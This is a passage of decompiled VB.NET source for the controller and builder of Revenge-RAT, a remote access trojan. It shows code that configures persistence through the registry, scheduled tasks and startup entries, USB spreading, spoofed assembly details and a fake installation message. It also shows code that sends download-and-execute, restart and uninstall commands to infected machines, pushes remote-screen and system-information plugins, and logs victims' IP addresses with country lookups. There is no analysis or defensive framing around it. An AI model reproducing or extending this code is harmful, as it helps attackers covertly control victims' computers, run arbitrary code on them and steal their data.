        Me.MsgboxTitle.Text = "Installation"
        Me.MsgboxBody.Text = "Revenge-RAT client has been successfully installed."
        Me.MsgBoxIcon.SelectedIndex = 0
        Me.MsgboxButton.SelectedIndex = 0
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator = Me.Listview1.SelectedItems.GetEnumerator()
            While enumerator.MoveNext()
                Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
                Me.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "True", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False"}))
            End While
        Finally
        End Try
    End Sub

    Private Sub RFM_Click(sender As Object, e As EventArgs) Handles RFM.Click
        If (Me.Listview1.Items.Count > 0) Then
            Try
                Me.PM.Image = Nothing
                Me.Label4.Text = ".."
                Me.CLC()
                Me.PM.Refresh()
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
            Me.RFM.Enabled = False
            Dim dz As New Thread(New ThreadStart(AddressOf Me.DW))
            dz.Start()
        End If
    End Sub
    Public Function Save() As Object
        Dim obj2 As Object
        Dim contents As String = My.Resources.Revenge.Replace("%S%", Me.Key).Replace("%P%", Conversions.ToString(Me.PO)).Replace("%M%", Conversions.ToString(Me.MST.Checked)).Replace("%L%", Me.ALTP.Checked.ToString).Replace("%T%", My.Forms.Entry_Form.PINGN.Value.ToString).Replace("%V%", Me.Visual.Checked.ToString).Replace("%N%", Me.Noti.Checked.ToString).Replace("%SN%", Me.SNO.Checked.ToString).Replace("%D%", Me.ASD.Checked.ToString).Replace("%DV%", Conversions.ToString(Me.RDV.SelectedIndex)).Replace("%W%", Me.ASWC.Checked.ToString).Replace("%WV%", Conversions.ToString(Me.RWCV.SelectedIndex)).Replace("%TV%", Conversions.ToString(Me.TQ.SelectedIndex)).Replace("%F%", Conversions.ToString(Me.FZ.SelectedIndex)).Replace("%G%", Me.gridlines.Checked.ToString).Replace("%VW%", Conversions.ToString(Me.VA.SelectedIndex)).Replace("%TH%", Conversions.ToString(Me.THN.SelectedIndex)).Replace("%AR%", Conversions.ToString(Me.ACR.Checked))
        File.WriteAllText((Application.StartupPath & "\Config.XML"), contents)
        If (Me.CT <> Me.THN.SelectedIndex) Then
            Me.Panel1.Visible = True
        End If
        Me.CK(Me.FZ.SelectedIndex, Me.ACR.Checked, Me.gridlines.Checked, Me.VA.SelectedIndex, Me.ASD.Checked, Me.RDV.SelectedIndex, Me.SNO.Checked, Me.Visual.Checked, Me.MST.Checked, Me.ASWC.Checked, Me.RWCV.SelectedIndex, Me.ALTP.Checked)
        Return obj2
    End Function

    Public Function Save_Builder_Settings(ByVal Profile As String) As Object
        Dim obj2 As Object
        Dim enumerator As IEnumerator
        Dim str2 As String = String.Empty
        Dim str3 As String = String.Empty
        Try
            enumerator = Me.HostsList.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str2 = (str2 & current.SubItems.Item(0).Text & ",")
                str3 = (str3 & current.SubItems.Item(1).Text & ",")
            Loop
        Finally
        End Try
        Dim contents As String = String.Concat(New String() {str2, ChrW(13) & ChrW(10), str3, ChrW(13) & ChrW(10), Me.ClientID.Text, ChrW(13) & ChrW(10), Me.ClientMutex.Text, ChrW(13) & ChrW(10), Me.RCD.Value.ToString, ChrW(13) & ChrW(10), Conversions.ToString(Me.DF.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.DropPathCombo.SelectedIndex), ChrW(13) & ChrW(10), Me.DN.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.Registry.Checked), ChrW(13) & ChrW(10), Me.RK.Text, ChrW(13) & ChrW(10), Me.RGVN.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.SCHULDER.Checked), ChrW(13) & ChrW(10), Me.Schname.Text, ChrW(13) & ChrW(10), Me.Schtime.Value.ToString, ChrW(13) & ChrW(10), Conversions.ToString(Me.CMPM.Checked), ChrW(13) & ChrW(10), Me.CNINAPPDATA.Text, ChrW(13) & ChrW(10), Me.TASKBARFN.Text, ChrW(13) & ChrW(10), Me.DESKTOPSHORTCUTPATH.Text, ChrW(13) & ChrW(10), Me.QUICKLUNCHSHORTCUTPATH.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.StartupNormal.Checked), ChrW(13) & ChrW(10), Me.StartNormalfile.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.VBSCK.Checked), ChrW(13) & ChrW(10), Me.VBSTX.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.JSCK.Checked), ChrW(13) & ChrW(10), Me.JSTX.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.LNKCK.Checked), ChrW(13) & ChrW(10), Me.LNKTX.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.URLCK.Checked), ChrW(13) & ChrW(10), Me.URLTX.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.StartupCodeDomCK.Checked), ChrW(13) & ChrW(10), Me.CodeDomTX.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.ENBPS.Checked), ChrW(13) & ChrW(10), Me.PSCommands.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.SMGB.Checked), ChrW(13) & ChrW(10), Me.MsgboxTitle.Text, ChrW(13) & ChrW(10), Me.MsgboxBody.Text.Replace(ChrW(13) & ChrW(10), "\r\n"), ChrW(13) & ChrW(10), Conversions.ToString(Me.MsgBoxIcon.SelectedIndex), ChrW(13) & ChrW(10), Conversions.ToString(Me.MsgboxButton.SelectedIndex), ChrW(13) & ChrW(10), Conversions.ToString(Me.AssemblyChange.Checked), ChrW(13) & ChrW(10), Me.AssTitle.Text, ChrW(13) & ChrW(10), Me.AssDes.Text, ChrW(13) & ChrW(10), Me.AssCom.Text, ChrW(13) & ChrW(10), Me.AssPro.Text, ChrW(13) & ChrW(10), Me.AssCopy.Text, ChrW(13) & ChrW(10), Me.AssTrade.Text, ChrW(13) & ChrW(10), Me.FileVersionTX.Text, ChrW(13) & ChrW(10), Me.ProductVersionTX.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.IE.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.VI.SelectedIndex), ChrW(13) & ChrW(10), Conversions.ToString(Me.PI.SelectedIndex), ChrW(13) & ChrW(10), Conversions.ToString(Me.EUSB.Checked), ChrW(13) & ChrW(10), Me.CNINUS.Text, ChrW(13) & ChrW(10), Me.FNIUS.Text, ChrW(13) & ChrW(10), Conversions.ToString(Me.TTINFHD.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.SCPROC.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.RGP.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.HFCK.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.PRPR.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.PRCB.SelectedIndex), ChrW(13) & ChrW(10), Conversions.ToString(Me.SleepCk.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.SleepTime.Value), ChrW(13) & ChrW(10), Conversions.ToString(Me.RCNNS.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.RadioButton1.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.RadioButton2.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.EXSPCK.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.EXSPL.SelectedIndex), ChrW(13) & ChrW(10), Conversions.ToString(Me.FP.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.BC.Value), ChrW(13) & ChrW(10), Conversions.ToString(Me.KB.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.MB.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.GB.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.MP.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.ATOS.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.ATAM.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.ANIL.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.OPT.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.STEN.Checked), ChrW(13) & ChrW(10), Conversions.ToString(Me.Obfu.Checked)})
        File.WriteAllText(("Profiles\" & Profile & ".ini"), contents)
        Return obj2
    End Function

    Public Sub SC(Sock As Integer)
        Try
            Dim enumerator As IEnumerator = Me.CommandsListview.Items.GetEnumerator()
            While enumerator.MoveNext()
                Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
                Dim imageIndex As Integer = Me.ImageList3.Images.IndexOfKey(Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) + ".png")
                Dim flag As Boolean = Conversions.ToDouble(listViewItem.ToolTipText) = 0.0
                If flag Then
                    Dim arg_206_0 As Object = Me.s
                    Dim arg_206_1 As Type = Nothing
                    Dim arg_206_2 As String = "Send"
                    Dim array As Object() = New Object() {Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("UNV" + Me.Key + Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)) + Me.Key + "UNI.UNI" + Me.Key + Me.RandomVariable(5, 8) + Me.Key + "False" + Me.Key + "False" + Me.Key + "True" + Me.Key + listViewItem.SubItems(1).Text + Me.Key, listViewItem.Tag), Me.Key), "False"), Me.Key), "False"), Me.Key), SocketServer.GenRandom(1, 10)), ".tmp"), Me.RandomVariable(1, 5)), Me.Key), Me.RandomVariable(1, 5)), Me.Key), "False")}
                    Dim arg_206_3 As Object() = array
                    Dim arg_206_4 As String() = Nothing
                    Dim arg_206_5 As Type() = Nothing
                    Dim array2 As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(arg_206_0, arg_206_1, arg_206_2, arg_206_3, arg_206_4, arg_206_5, array2, True)
                    If array2(0) Then
                        Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array(0)), GetType(Integer)))
                    End If
                    Dim listViewItem2 As ListViewItem = Me.Logs.Items.Add(Sock.ToString(), String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(Sock), " - Server ID : ????"}), imageIndex)
                    listViewItem2.SubItems.Add("Download and execute from URL")
                    listViewItem2.ForeColor = Color.Blue
                    listViewItem2.ForeColor = Color.Blue
                    listViewItem2.ToolTipText = Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) + ".png"
                Else
                    flag = (Conversions.ToDouble(listViewItem.ToolTipText) = 1.0)
                    If flag Then
                        Me.s.Send(Sock, String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False"}))
                        Dim listViewItem3 As ListViewItem = Me.Logs.Items.Add(Sock.ToString(), String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(Sock), " - Server ID : ????"}), imageIndex)
                        listViewItem3.ForeColor = Color.PaleVioletRed
                        listViewItem3.SubItems.Add("Uninstall")
                        listViewItem3.ForeColor = Color.PaleVioletRed
                        listViewItem3.ToolTipText = Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) + ".png"
                    Else
                        flag = (Conversions.ToDouble(listViewItem.ToolTipText) = 2.0)
                        If flag Then
                            Me.s.Send(Sock, String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "True", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False"}))
                            Dim listViewItem4 As ListViewItem = Me.Logs.Items.Add(Sock.ToString(), String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(Sock), " - Server ID : ????"}), imageIndex)
                            listViewItem4.ForeColor = Color.MidnightBlue
                            listViewItem4.SubItems.Add("Restart")
                            listViewItem4.ForeColor = Color.MidnightBlue
                            listViewItem4.ToolTipText = Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) + ".png"
                        Else
                            flag = (Conversions.ToDouble(listViewItem.ToolTipText) = 3.0)
                            If flag Then
                                Me.s.Send(Sock, String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "True", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False"}))
                                Dim listViewItem5 As ListViewItem = Me.Logs.Items.Add(Sock.ToString(), String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(Sock), " - Server ID : ????"}), imageIndex)
                                listViewItem5.SubItems.Add("Close")
                                listViewItem5.ForeColor = Color.DeepSkyBlue
                                listViewItem5.ForeColor = Color.DeepSkyBlue
                                listViewItem5.ToolTipText = Me.GeoIP.LookupCountryName(Me.s.IP(Sock)) + ".png"
                            End If
                        End If
                    End If
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub SCHULDER_CheckedChanged(sender As Object, e As EventArgs) Handles SCHULDER.CheckedChanged
        Me.Schname.Enabled = Me.SCHULDER.Checked
        Me.Schtime.Enabled = Me.SCHULDER.Checked
        If (Me.Schname.Text = Nothing) Then
            Me.Schname.Text = "Client"
        End If
    End Sub
    Public Sub SDAPC()
        Try
            Dim num2 As Integer
            Dim num3 As Integer
Label_0003:
            num3 = 1
            Thread.Sleep(Me.TIME)
Label_0012:
            ProjectData.ClearProjectError()
            Dim num As Integer = -2
Label_001B:
            num3 = 3
            If (Me.Listview1.Items.Count = 0) Then
                GoTo Label_018D
            End If
Label_003D:
            num3 = 4
            Dim enumerator As IEnumerator = Me.Listview1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
Label_0062:
                num3 = 5
                If Not Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(current.Tag, "", False))) Then
                    GoTo Label_0159
                End If
Label_0089:
                num3 = 6
                If Not Operators.ConditionalCompareObjectEqual(current.Tag, "Timeout", False) Then
                    GoTo Label_00B9
                End If
Label_00A3:
                num3 = 7
                Me.disconnected(Conversions.ToInteger(current.ToolTipText))
Label_00B9:
                num3 = 9
                If Not Operators.ConditionalCompareObjectEqual(current.Tag, "1", False) Then
                    GoTo Label_00E5
                End If
Label_00D4:
                num3 = 10
                current.Tag = "Timeout"
Label_00E5:
                num3 = 12
                If Not Operators.ConditionalCompareObjectEqual(current.Tag, "0", False) Then
                    GoTo Label_0111
                End If
Label_0100:
                num3 = 13
                current.Tag = "1"
Label_0111:
                num3 = 15
                If (current.ToolTipText.ToString = "") Then
                    GoTo Label_0159
                End If
Label_0137:
                num3 = &H10
                Me.s.Send(Conversions.ToInteger(current.ToolTipText), "PNC")
Label_0159:
                num3 = &H13
            Loop
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
Label_018D:
            ProjectData.ClearProjectError()
            num = -3
Label_0196:
            num3 = &H16
            If Directory.Exists(("Database\" & Me.TI)) Then
                GoTo Label_01D3
            End If
Label_01B8:
            num3 = &H17
            Directory.CreateDirectory(("Database\" & Me.TI))
Label_01D3:
            num3 = &H19
            Dim contents As String = String.Empty
Label_01DD:
            num3 = &H1A
            If (contents = Nothing) Then
                GoTo Label_0206
            End If
Label_01F5:
            num3 = &H1B
            contents = Nothing
Label_01FB:
            num3 = &H1C
            contents = ""
Label_0206:
            num3 = 30
            Dim enumerator2 As IEnumerator = Me.Logs.Items.GetEnumerator
            Do While enumerator2.MoveNext
                Dim item2 As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
Label_022E:
                num3 = &H1F
                contents = String.Concat(New String() {contents, item2.SubItems.Item(0).Text, "|", item2.SubItems.Item(1).Text, "|", item2.ToolTipText, "|"})
Label_029D:
                num3 = &H20
            Loop
            If TypeOf enumerator2 Is IDisposable Then
                TryCast(enumerator2, IDisposable).Dispose()
            End If
Label_02D3:
            num3 = &H21
            If Not File.Exists(String.Concat(New String() {"Database\", Me.TI, "\", Me.TI2, ".log"})) Then
                GoTo Label_0373
            End If
Label_0325:
            num3 = &H22
            File.Delete(String.Concat(New String() {"Database\", Me.TI, "\", Me.TI2, ".log"}))
Label_0373:
            num3 = &H24
            File.WriteAllText(String.Concat(New String() {"Database\", Me.TI, "\", Me.TI2, ".log"}), contents)
            GoTo Label_0003
Label_03D3:
            num2 = 0
            Select Case (num2 + 1)
                Case 1, &H25
                    GoTo Label_0003
                Case 2
                    GoTo Label_0012
                Case 3
                    GoTo Label_001B
                Case 4
                    GoTo Label_003D
                Case 5
                    GoTo Label_0062
                Case 6
                    GoTo Label_0089
                Case 7
                    GoTo Label_00A3
                Case 8, 9
                    GoTo Label_00B9
                Case 10
                    GoTo Label_00D4
                Case 11, 12
                    GoTo Label_00E5
                Case 13
                    GoTo Label_0100
                Case 14, 15
                    GoTo Label_0111
                Case &H10
                    GoTo Label_0137
                Case &H11, &H12, &H13
                    GoTo Label_0159
                Case 20, &H15
                    GoTo Label_018D
                Case &H16
                    GoTo Label_0196
                Case &H17
                    GoTo Label_01B8
                Case &H18, &H19
                    GoTo Label_01D3
                Case &H1A
                    GoTo Label_01DD
                Case &H1B
                    GoTo Label_01F5
                Case &H1C
                    GoTo Label_01FB
                Case &H1D, 30
                    GoTo Label_0206
                Case &H1F
                    GoTo Label_022E
                Case &H20
                    GoTo Label_029D
                Case &H21
                    GoTo Label_02D3
                Case &H22
                    GoTo Label_0325
                Case &H23, &H24
                    GoTo Label_0373
                Case &H26
                    If (num2 <> 0) Then
                        ProjectData.ClearProjectError()
                    End If
                    Return
                Case Else
                    GoTo Label_04B9
            End Select
Label_0479:
            num2 = num3
            Select Case If((num > -2), num, 1)
                Case 0
                    GoTo Label_04B9
                Case 1
                    GoTo Label_03D3
            End Select
        Catch obj1 As Exception
            GoTo Label_0479
        End Try
Label_04B9:
        '   Throw ProjectData.CreateProjectError(-2146828237)
    End Sub
    Private Sub ScriptsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScriptsToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\SC.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SC.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SC", Me.Key, "SC"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectAllToolStripMenuItem.Click
        Dim num4 As Integer
        Try
            Dim num5 As Integer
Label_0001:
            ProjectData.ClearProjectError()
            Dim num3 As Integer = -2
Label_0009:
            num5 = 2
            Dim num2 As Integer = (Me.Listview1.Items.Count - 1)
            Dim num As Integer = 0
            GoTo Label_0046
Label_0023:
            num5 = 3
            Me.Listview1.Items.Item(num).Selected = True
Label_003E:
            num5 = 4
            num += 1
Label_0046:
            If (num <= num2) Then
                GoTo Label_0023
            End If
            GoTo Label_00BD
Label_0053:
            num4 = 0
            Select Case (num4 + 1)
                Case 1
                    GoTo Label_0001
                Case 2
                    GoTo Label_0009
                Case 3
                    GoTo Label_0023
                Case 4
                    GoTo Label_003E
                Case 5
                    GoTo Label_00BD
                Case Else
                    GoTo Label_00B2
            End Select
Label_0077:
            num4 = num5
            Select Case If((num3 > -2), num3, 1)
                Case 0
                    GoTo Label_00B2
                Case 1
                    GoTo Label_0053
            End Select
        Catch obj1 As Exception
            GoTo Label_0077
        End Try
Label_00B2:
        '  Throw ProjectData.CreateProjectError(-2146828237)
Label_00BD:
    End Sub

    Private Sub SelectNoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectNoneToolStripMenuItem.Click
        Dim num4 As Integer
        Try
            Dim num5 As Integer
Label_0001:
            ProjectData.ClearProjectError()
            Dim num3 As Integer = -2
Label_0009:
            num5 = 2
            Dim num2 As Integer = (Me.Listview1.Items.Count - 1)
            Dim num As Integer = 0
            GoTo Label_0046
Label_0023:
            num5 = 3
            Me.Listview1.Items.Item(num).Selected = False
Label_003E:
            num5 = 4
            num += 1
Label_0046:
            If (num <= num2) Then
                GoTo Label_0023
            End If
            GoTo Label_00BD
Label_0053:
            num4 = 0
            Select Case (num4 + 1)
                Case 1
                    GoTo Label_0001
                Case 2
                    GoTo Label_0009
                Case 3
                    GoTo Label_0023
                Case 4
                    GoTo Label_003E
                Case 5
                    GoTo Label_00BD
                Case Else
                    GoTo Label_00B2
            End Select
Label_0077:
            num4 = num5
            Select Case If((num3 > -2), num3, 1)
                Case 0
                    GoTo Label_00B2
                Case 1
                    GoTo Label_0053
            End Select
        Catch obj1 As Exception
            GoTo Label_0077
        End Try
Label_00B2:
        '   Throw ProjectData.CreateProjectError(-2146828237)
Label_00BD:
    End Sub

    Private Sub SleepCk_CheckedChanged(sender As Object, e As EventArgs) Handles SleepCk.CheckedChanged
        Me.SleepTime.Enabled = Me.SleepCk.Checked
        Me.Label45.Visible = Me.SleepCk.Checked
    End Sub

    Private Sub SMGB_CheckedChanged(sender As Object, e As EventArgs) Handles SMGB.CheckedChanged
        Me.MsgboxTitle.Enabled = Me.SMGB.Checked
        Me.MsgboxBody.Enabled = Me.SMGB.Checked
        Me.MsgBoxIcon.Enabled = Me.SMGB.Checked
        Me.MsgboxButton.Enabled = Me.SMGB.Checked
        Me.PreviewMsgBox.Enabled = Me.SMGB.Checked
        Me.ResetMsgbox.Enabled = Me.SMGB.Checked
        If (Me.MsgboxTitle.Text = Nothing) Then
            Me.MsgboxTitle.Text = "Installation"
        End If
        If (Me.MsgboxBody.Text = Nothing) Then
            Me.MsgboxBody.Text = "Revenge-RAT client has been successfully installed."
        End If
        If (Me.MsgBoxIcon.SelectedIndex = -1) Then
            Me.MsgBoxIcon.SelectedIndex = 0
        End If
        If (Me.MsgboxButton.SelectedIndex = -1) Then
            Me.MsgboxButton.SelectedIndex = 0
        End If
    End Sub

    Private Sub SpreadSettings_Click(sender As Object, e As EventArgs) Handles SpreadSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.SpreadSettings.Tag, "Down", False) Then
            Me.SpreadSettings.Tag = "Up"
            Me.SpreadSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel46.Size.Width, &H20)
            Me.TableLayoutPanel46.Size = size3
        Else
            Me.SpreadSettings.Tag = "Down"
            Me.SpreadSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel46.Size.Width, 160)
            Me.TableLayoutPanel46.Size = size2
        End If
    End Sub

    Private Sub Startc_Click(sender As Object, e As EventArgs) Handles Startc.Click
        Try
            If (Me.Startc.Text = "Start") Then
                Me.Startc.Text = "Stop"
                Me.Load_Config()

                Try
                    Me.TH.Items.Clear()
                Catch exception1 As Exception
                End Try
                Try
                    Me.Thumb.Images.Clear()
                Catch exception2 As Exception
                End Try
                Dim size2 As New Size(Conversions.ToInteger(Me.ThumbnailWidth.Value.ToString), Conversions.ToInteger(Me.ThumbnailHeight.Value.ToString))
                Me.Thumb.ImageSize = size2
                Me.ThumbnailWidth.Enabled = False
                Me.ThumbnailHeight.Enabled = False
                If ((Me.Listview1.Items.Count > 0) AndAlso File.Exists((Application.StartupPath & "\Plugin\SP.dll"))) Then
                    Dim enumerator As IEnumerator
                    Try
                        enumerator = Me.Listview1.Items.GetEnumerator
                        Do While enumerator.MoveNext
                            Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                            Me.Thumb.Images.Add(current.ToolTipText, New Bitmap(My.Resources.Loading))
                            Dim item2 As ListViewItem = current
                            Dim num4 As Integer = Conversions.ToInteger(item2.ToolTipText)
                            item2.ToolTipText = Conversions.ToString(num4)
                            Me.TH.Items.Add(current.ToolTipText, ("@" & current.SubItems.Item(3).Text & " / " & Me.s.IP(num4)), current.ToolTipText).ToolTipText = current.ToolTipText
                            If (current.SubItems.Item(15).Text = "....") Then
                                If File.Exists((Application.StartupPath & "\Plugin\SP.dll")) Then
                                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SP.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SP", Me.Key, "SP"}))
                                End If
                            Else
                                Dim num As Integer = Conversions.ToInteger(SocketServer.GetIndex(Me.TQ.SelectedIndex))
                                Me.s.Send(Conversions.ToInteger(current.SubItems.Item(15).Text), String.Concat(New String() {"GP2", Me.Key, Conversions.ToString(num), Me.Key, Me.ThumbnailWidth.Value.ToString, Me.Key, Me.ThumbnailHeight.Value.ToString}))
                            End If
                        Loop
                    Finally
                    End Try
                    Me.Timer4.Interval = CInt(Math.Round(CDbl((Conversions.ToDouble(Me.NumericUpDown1.Value.ToString) * 1000))))
                    Me.Timer4.Enabled = True
                    Me.NumericUpDown1.Enabled = False
                End If
            Else
                Me.Startc.Text = "Start"
                Try
                    Me.TH.Items.Clear()
                Catch exception3 As Exception
                End Try
                Me.Timer4.Enabled = False
                Me.NumericUpDown1.Enabled = True
                Me.ThumbnailWidth.Enabled = True
                Me.ThumbnailHeight.Enabled = True
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub StartupCodeDomCK_CheckedChanged(sender As Object, e As EventArgs) Handles StartupCodeDomCK.CheckedChanged
        Me.CodeDomTX.Enabled = Me.StartupCodeDomCK.Checked
        If (Me.CodeDomTX.Text = Nothing) Then
            Me.CodeDomTX.Text = "Client.exe"
        End If
    End Sub

    Private Sub StartupNormal_CheckedChanged(sender As Object, e As EventArgs) Handles StartupNormal.CheckedChanged
        Me.StartNormalfile.Enabled = Me.StartupNormal.Checked
        If (Me.StartNormalfile.Text = Nothing) Then
            Me.StartNormalfile.Text = "Client.exe"
        End If
    End Sub

    Private Sub StartupSettings_Click(sender As Object, e As EventArgs) Handles StartupSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.StartupSettings.Tag, "Down", False) Then
            Me.StartupSettings.Tag = "Up"
            Me.StartupSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel23.Size.Width, &H20)
            Me.TableLayoutPanel23.Size = size3
        Else
            Me.StartupSettings.Tag = "Down"
            Dim size2 As New Size(Me.TableLayoutPanel23.Size.Width, &H134)
            Me.TableLayoutPanel23.Size = size2
            Me.StartupSettings.Image = My.Resources.expand_more_white_24x24
        End If
    End Sub

    Private Sub SystemInformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemInformationToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\SI.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SI.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SI", Me.Key, "SI"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub SystemManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemManagerToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\SM.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
